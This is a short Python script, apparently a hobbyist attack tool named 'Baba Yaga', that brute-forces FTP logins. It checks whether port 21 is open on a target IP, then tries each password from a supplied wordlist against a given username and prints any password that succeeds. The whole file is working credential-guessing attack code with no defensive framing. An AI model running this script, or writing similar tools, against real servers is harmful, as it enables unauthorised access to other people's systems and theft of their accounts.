
from colorama import Fore
import ftplib
import socket
import sys
import threading 

print(' \t\t\t ###################')
print(' \t\t\t ##   Baba Yaga   ##')
print(' \t\t\t ################### ')


IP = sys.argv[1]
user = sys.argv[2]
wordlist = sys.argv[3]


if(len(sys.argv) < 3):
    exit(-1)


def ping(IP):

    pinger = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    connection = pinger.connect_ex((IP,21))
    if(connection == 0):
        print("[*] PORT 21 : OPEN")
    else:
        print("[*] PORT 21 : CLOSE")
        pinger.close()
        



def Login(wordlist):
    f = open(wordlist,'r')
    print(" Attacking port 21 FTP")
    for line in f.readlines():
        passw = line.strip()
        try:
            ftp = ftplib.FTP(IP)
            ftp.login(user,passw)
            print(Fore.RED + "[++] Found password : {}".format(passw))
            ftp.quit()
            break

        except:
            #print("Something went wrong , try again")

            print(Fore.GREEN + "[-] Wrong password : {}".format(passw))

def main():
    ping(IP)
    Login(wordlist)     


main()
